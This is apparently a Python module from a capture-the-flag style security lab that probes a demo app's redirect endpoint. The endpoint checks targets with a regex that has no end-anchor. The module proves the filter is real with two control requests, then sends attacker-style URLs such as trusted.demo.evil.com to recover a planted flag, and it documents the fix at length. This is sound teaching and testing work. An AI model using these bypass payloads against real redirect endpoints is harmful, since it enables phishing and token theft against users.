"""Open-redirect / allow-list bypass via a missing regex end-anchor.

WHAT IT IS
----------
The demo app exposes a redirect endpoint that is *supposed* to forward users
only to the trusted host ``trusted.demo`` (and its sub-domains
``*.trusted.demo``). It guards the target URL with a regular expression::

    # GET /api/redirect?url=<url>
    if not re.match(r"^https?://([a-z0-9-]+\\.)?trusted\\.demo", url):
        return 400  # untrusted redirect target
    return 200, {"redirect": url, "flag": ...}

The fatal flaw is that the pattern is **anchored only at the START**. In
Python, :func:`re.match` implicitly anchors the regex at the *beginning* of the
string (as if it began with ``\\A``) but **not** at the end -- there is no
trailing ``$`` / ``\\Z``, and the host portion is not delimited (no ``/``,
``?``, ``#``, ``:`` or end-of-string boundary closes off the host). So the
regex only checks that the URL *begins with* ``https://<optional-label>.``
``trusted.demo`` and then **stops caring** about whatever follows. Any URL whose
host merely *starts with* the literal ``trusted.demo`` is accepted, even though
its real, registrable domain belongs to an attacker:

  - ``https://trusted.demo.evil.com/`` -- the host is ``trusted.demo.evil.com``;
    its registrable domain is ``evil.com`` (attacker-controlled). ``trusted.demo``
    is just a left-most label *prefix*, so the regex matches and the URL is
    **ACCEPTED**. A victim who clicks the "trusted" link lands on the attacker's
    server (phishing / token theft via the ``redirect`` parameter).
  - ``https://trusted.demoattacker.com/`` -- the host is
    ``trusted.demoattacker.com`` (registrable ``demoattacker.com``). Because
    ``trusted\\.demo`` is not followed by a boundary, the regex happily matches
    the ``trusted.demo`` prefix of ``trusted.demoattacker`` and the URL is
    **ACCEPTED** as well.

A genuinely trusted URL like ``https://trusted.demo/welcome`` is *also* accepted
-- that is the intended behaviour, **not** a bypass. A plainly external URL like
``https://evil.com/`` does **not** start with the required prefix, so it is
correctly **REJECTED** (HTTP 400). The planted prize for the bypass is
:data:`C.FLAGS["regex_bypass"]`.

HOW WE DISCOVER IT
------------------
We use a **differential** proof that the filter is real before claiming any
acceptance is a bypass:

1. **A legitimate trusted URL is accepted (the positive control).**
   ``GET /api/redirect?url=https://trusted.demo/welcome`` returns HTTP 200 with
   the flag. This shows the endpoint actually performs a redirect for the host
   it is meant to allow.

2. **A plainly external URL is rejected (the negative control).**
   ``GET /api/redirect?url=https://evil.com/`` returns HTTP 400 and no flag.
   This shows the endpoint is **not** an open door -- it really applies an
   allow-list filter.

Only when BOTH controls behave correctly do we know the filter is genuine; an
attacker-controlled host that is nonetheless accepted is then a *real* bypass of
that filter, not an unguarded redirect.

HOW WE EXPLOIT IT
-----------------
For each attacker URL in :data:`PAYLOADS` (hosts whose registrable domain is NOT
``trusted.demo`` but which still begin with the allowed ``trusted.demo`` label
prefix), we issue ``GET /api/redirect?url=<payload>`` and check for a
200-plus-flag response. Every payload that is wrongly accepted is reported, and
the flag is recovered from the first one that works. ``exploit_result`` records
the per-payload attempt log, the parsed attacker host vs. the intended
``trusted.demo``, and a one-line explanation of the missing ``$`` anchor.

THE FIX
-------
See :data:`REMEDIATION`. In one line: anchor the match at BOTH ends (use
:func:`re.fullmatch`, or add ``\\Z``/``$`` *and* close off the host with an
explicit boundary), but better still **stop validating URLs with regexes** --
parse the URL with a real URL parser, extract the host, lower-case it, and
compare it against an exact allow-list (``host == "trusted.demo" or
host.endswith(".trusted.demo")``), rejecting anything else.
"""
from __future__ import annotations

import re
import urllib.parse
from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "The bug is a regex anchored only at the START: Python's re.match() implicitly "
    "anchors at the beginning of the string but NOT at the end, and the pattern "
    "'^https?://([a-z0-9-]+\\.)?trusted\\.demo' has no trailing $ / \\Z and no host "
    "delimiter, so it accepts any URL whose host merely STARTS WITH 'trusted.demo' "
    "(e.g. trusted.demo.evil.com or trusted.demoattacker.com). (1) The minimal fix "
    "is to anchor BOTH ends -- use re.fullmatch() instead of re.match(), or append "
    "'$'/'\\Z' AND close off the host with an explicit boundary (a '/', '?', '#', "
    "':' or end-of-string) so 'trusted.demo' must be the WHOLE host, not a prefix. "
    "(2) The robust fix is to STOP validating URLs with regexes entirely: parse the "
    "URL with a real parser (urllib.parse.urlparse / a URL library), reject anything "
    "that is not http/https or lacks a hostname, take the parsed .hostname, "
    "lower-case it, and compare it against an EXACT allow-list -- accept only when "
    "host == 'trusted.demo' or host.endswith('.trusted.demo'); reject everything "
    "else, including userinfo (user@host), embedded credentials, and backslash/"
    "whitespace tricks. (3) Treat the registrable domain, not a string prefix, as "
    "the trust boundary: 'trusted.demo.evil.com' belongs to evil.com and must never "
    "be confused with the trusted.demo zone. (4) Defence in depth: avoid "
    "reflecting arbitrary user input into redirects at all -- prefer indirection "
    "(map an opaque ID/token to a server-side allow-listed URL) so attacker-supplied "
    "absolute URLs never reach the Location header."
)

#: The vulnerable endpoint, shown in reports.
ENDPOINT: str = "/api/redirect"

#: HTTP method + parameter the sink expects: ``?url=<target>``.
HTTP_METHOD: str = "GET"

#: The host the allow-list is *intended* to permit (it and its sub-domains).
TRUSTED_HOST: str = "trusted.demo"

#: A legitimate, in-scope URL used as the POSITIVE control: its host IS
#: ``trusted.demo``, so a correct filter accepts it (intended use, not a bypass).
LEGIT_URL: str = "https://trusted.demo/welcome"

#: A plainly-external URL used as the NEGATIVE control: its host does not begin
#: with the allowed prefix, so a correct filter REJECTS it (HTTP 400).
REJECTED_URL: str = "https://evil.com/"

#: Attacker-controlled bypass URLs. Each host's registrable domain belongs to an
#: ATTACKER (evil.com / demoattacker.com), yet each begins with the allowed
#: ``trusted.demo`` label prefix, so the un-anchored regex matches and accepts it.
PAYLOADS: List[str] = [
    "https://trusted.demo.evil.com/",
    "https://trusted.demoattacker.com/",
    "https://trusted.demo.attacker.example/login",
    "https://trusted.demonstration.evil.com/",
]


# --- host parsing helpers (local, for evidence + the logic control) ----------
def _host_of(url: str) -> str:
    """Return the lower-cased hostname of ``url`` (empty string if unparsable)."""
    return (urllib.parse.urlparse(url).hostname or "").lower()


def _registrable_domain(host: str) -> str:
    """Crude registrable domain = the last two labels of ``host``.

    Enough for this lab's hosts (``trusted.demo.evil.com`` -> ``evil.com``); it
    is used only to PROVE a payload host belongs to an attacker, i.e. its
    registrable domain is NOT ``trusted.demo``, while it still *starts with* the
    allowed ``trusted.demo`` prefix.
    """
    labels = [label for label in host.split(".") if label]
    return ".".join(labels[-2:]) if len(labels) >= 2 else host


def is_attacker_controlled(url: str) -> bool:
    """True if ``url``'s host is attacker-owned yet abuses the allowed prefix.

    A genuine bypass payload (a) has a registrable domain that is NOT
    ``trusted.demo`` (so it really belongs to an attacker), yet (b) its host
    still begins with the ``trusted.demo`` label prefix that fools the
    un-anchored regex. Used by the tests as a pure-logic assertion.
    """
    host = _host_of(url)
    if not host:
        return False
    starts_with_prefix = host.startswith(TRUSTED_HOST)
    attacker_owned = _registrable_domain(host) != TRUSTED_HOST
    return starts_with_prefix and attacker_owned


# --- low-level probe ---------------------------------------------------------
def _attempt(client: WebClient, url: str) -> Response:
    """Drive the sink once: ``GET /api/redirect?url=<url>``."""
    return client.get(ENDPOINT, params={"url": url})


def _accepted(resp: Response) -> bool:
    """True if the redirect was accepted (HTTP 200) AND carries the planted flag."""
    if resp.status != 200:
        return False
    if C.FLAGS["regex_bypass"] not in resp.text:
        return False
    try:
        body = resp.json()
    except ValueError:
        return True  # flag present even if body is not strict JSON
    return isinstance(body, dict) and body.get("flag") == C.FLAGS["regex_bypass"]


# --- detection (differential controls) ---------------------------------------
def detect(client: WebClient) -> Tuple[bool, str]:
    """Prove the allow-list filter is REAL via two differential controls.

    The legit ``trusted.demo`` URL must be ACCEPTED (200 + flag) AND a plainly-
    external host must be REJECTED (400, no flag). When both hold, the filter is
    genuine -- so a later acceptance of an attacker-controlled host is a real
    bypass, not an unguarded open redirect. Returns ``(filter_is_real,
    evidence)``.
    """
    legit_resp = _attempt(client, LEGIT_URL)
    legit_accepted = _accepted(legit_resp)

    external_resp = _attempt(client, REJECTED_URL)
    external_rejected = (
        external_resp.status == 400
        and C.FLAGS["regex_bypass"] not in external_resp.text
    )

    filter_is_real = legit_accepted and external_rejected
    if filter_is_real:
        evidence = (
            f"control: the legit in-scope URL {LEGIT_URL!r} (host {_host_of(LEGIT_URL)!r}) "
            f"was ACCEPTED (HTTP {legit_resp.status}, flag present) and the external "
            f"URL {REJECTED_URL!r} (host {_host_of(REJECTED_URL)!r}) was REJECTED "
            f"(HTTP {external_resp.status}, no flag) -- the allow-list filter is real"
        )
    else:
        evidence = ""
    return filter_is_real, evidence


# --- the bypass: which attacker hosts were wrongly accepted -------------------
def find_bypasses(client: WebClient) -> Tuple[bool, List[str], str]:
    """Find attacker-controlled URLs the un-anchored regex wrongly ACCEPTS.

    For each payload whose host is attacker-owned (verified locally) but begins
    with the allowed ``trusted.demo`` prefix, issue the request and record those
    accepted with HTTP 200 + flag. Returns ``(any_bypassed, accepted_urls,
    evidence)``.
    """
    accepted: List[str] = []
    for url in PAYLOADS:
        # Only count it as a bypass if the host is genuinely attacker-controlled
        # (registrable domain != trusted.demo); otherwise it would be intended use.
        if not is_attacker_controlled(url):
            continue
        if _accepted(_attempt(client, url)):
            accepted.append(url)
    if accepted:
        forms = ", ".join(
            f"{url!r} (host {_host_of(url)!r}, registrable "
            f"{_registrable_domain(_host_of(url))!r})"
            for url in accepted
        )
        evidence = (
            f"{len(accepted)}/{len([u for u in PAYLOADS if is_attacker_controlled(u)])} "
            f"attacker-controlled URLs were wrongly ACCEPTED via {HTTP_METHOD} "
            f"{ENDPOINT}: {forms}. Each host merely STARTS WITH the allowed "
            f"{TRUSTED_HOST!r} prefix; the regex has no end-anchor ($/\\Z), so "
            f"re.match() never checks what follows the prefix"
        )
        return True, accepted, evidence
    return False, [], ""


# --- exploitation ------------------------------------------------------------
def exploit(client: WebClient) -> Tuple[bool, Optional[str], List[Dict[str, str]]]:
    """Submit each attacker URL; recover the flag from the first accepted one.

    Returns ``(ok, flag, attempts)`` where ``attempts`` logs every payload tried
    with its parsed host, registrable domain, HTTP status and acceptance flag
    (for the report).
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    for url in PAYLOADS:
        resp = _attempt(client, url)
        accepted = _accepted(resp)
        if accepted and flag is None:
            flag = C.FLAGS["regex_bypass"]
        host = _host_of(url)
        attempts.append(
            {
                "url": url,
                "host": host,
                "registrable_domain": _registrable_domain(host),
                "attacker_controlled": str(is_attacker_controlled(url)),
                "status": str(resp.status),
                "accepted": str(accepted),
            }
        )
    ok = flag == C.FLAGS["regex_bypass"]
    return ok, flag, attempts


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the open-redirect allow-list bypass, then exploit it (recover flag).

    Differential proof: a legit ``trusted.demo`` URL is accepted AND a plainly-
    external host is rejected (so the filter is real), yet an attacker-controlled
    host that merely STARTS WITH the ``trusted.demo`` prefix is also accepted --
    because the guard regex is anchored only at the start (no ``$``/``\\Z`` and no
    host delimiter), so :func:`re.match` never validates what follows the prefix.
    ``exploit_result`` and ``extra`` carry which payloads bypassed, the recovered
    flag, the parsed attacker host vs. the intended ``trusted.demo``, and a
    one-line summary of the missing end-anchor.
    """
    techniques: List[str] = []

    # 1) Detection / differential controls ----------------------------------
    filter_is_real, control_ev = detect(client)
    if filter_is_real:
        techniques.append("filter-proven-real")

    # 2) The bypass: attacker hosts wrongly accepted ------------------------
    bypassed, accepted_urls, bypass_ev = find_bypasses(client)
    if bypassed:
        techniques.append("regex-prefix-bypass")

    # 3) Exploitation: recover the flag -------------------------------------
    ok, flag, attempts = exploit(client)
    if ok:
        techniques.append("recover-flag")

    # Discovery requires ALL THREE: the filter is proven real (legit accepted +
    # external rejected), at least one attacker-controlled host was accepted, and
    # the flag was recovered.
    discovered = bool(filter_is_real and bypassed and ok)

    # 4) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if filter_is_real:
        evidence_parts.append(control_ev)
    if bypassed:
        evidence_parts.append(f"bypass: {bypass_ev}")
    evidence = " || ".join(evidence_parts)

    winning = accepted_urls[0] if accepted_urls else ""
    winning_host = _host_of(winning) if winning else ""
    summary = (
        f"the guard regex '^https?://([a-z0-9-]+\\.)?trusted\\.demo' is anchored "
        f"only at the START (re.match anchors \\A but there is no end-anchor $/\\Z "
        f"and no host delimiter), so {winning!r} -- whose real host {winning_host!r} "
        f"(registrable {_registrable_domain(winning_host)!r}) is attacker-controlled "
        f"-- is ACCEPTED merely because it STARTS WITH the allowed {TRUSTED_HOST!r} "
        f"prefix. Recovered flag {flag!r} -- an open-redirect allow-list bypass"
        if winning
        else "no attacker-controlled host was accepted; the filter appears sound"
    )

    exploit_result = {
        "flag": flag,
        "payload": winning,
        "winning_host": winning_host,
        "winning_registrable_domain": _registrable_domain(winning_host),
        "intended_trusted_host": TRUSTED_HOST,
        "bypassed_urls": accepted_urls,
        "legit_control_url": LEGIT_URL,
        "rejected_control_url": REJECTED_URL,
        "attempts": attempts,
        "techniques": techniques,
        "summary": summary,
    }

    return Finding(
        vuln="Open Redirect / Allow-list Bypass (missing regex end-anchor)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=winning,
        extra={
            "techniques": techniques,
            "filter_proven_real": filter_is_real,
            "legit_control_url": LEGIT_URL,
            "rejected_control_url": REJECTED_URL,
            "bypass_succeeded": bypassed,
            "flag_recovered": ok,
            "bypassed_urls": accepted_urls,
            "winning_payload": winning,
            "winning_host": winning_host,
            "winning_registrable_domain": _registrable_domain(winning_host),
            "intended_trusted_host": TRUSTED_HOST,
            "attempts": attempts,
            "summary": summary,
        },
    )
